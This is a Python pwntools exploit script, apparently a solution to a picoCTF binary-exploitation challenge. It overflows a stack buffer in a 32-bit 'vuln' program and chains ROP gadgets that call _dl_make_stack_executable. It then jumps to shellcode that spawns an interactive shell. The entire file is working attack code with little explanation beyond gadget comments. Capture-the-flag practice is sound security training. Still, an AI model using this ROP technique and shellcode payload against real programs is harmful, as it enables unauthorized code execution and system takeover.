from pwn import *

# from pprint import pprint

context.update(arch='i386', os='linux', endian='little') #acquired context from file command

elf = ELF("./vuln")
# p = remote("saturn.picoctf.net", 55219) #ports may vary between different instance launched
p = elf.process()

# pprint(elf.symbols)

#dmesg after running this shows us the IP being overwritten to 0x61656161
# p.sendline(cyclic(50)) 

payload = [
    cyclic(cyclic_find(0x61656161)), #make a payload from the buffer offset 
    # pack(0x0804afba), # pop esi ; ret

    pack(0x08064371), #pop ecx, ret
    pack(elf.symbols['__stack_prot']),

    # pack(0x08049022), #pop ebx ; ret
    pack(0x080b089a), #pop eax ; ret

    pack(0x7), #PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE

    # pack(0x0807f654), #mov dword ptr [eax], ebx (might not work)
    pack(0x080afcf4), #add dword ptr [ecx], eax ; ret
    
    # pack(0x08070740), #pop edi ; ret (might not work)
    # pack(0x08049022), #pop ebx ; ret
    pack(0x080b089a), #pop eax ; ret

    pack(elf.symbols['__libc_stack_end']),

    pack(elf.symbols['_dl_make_stack_executable']),
    pack(0x080b08aa), #push esp; ret

    asm(shellcraft.sh())
]

# print(payload)

payload = b"".join(payload)
p.sendline(payload)

p.interactive()
p.close()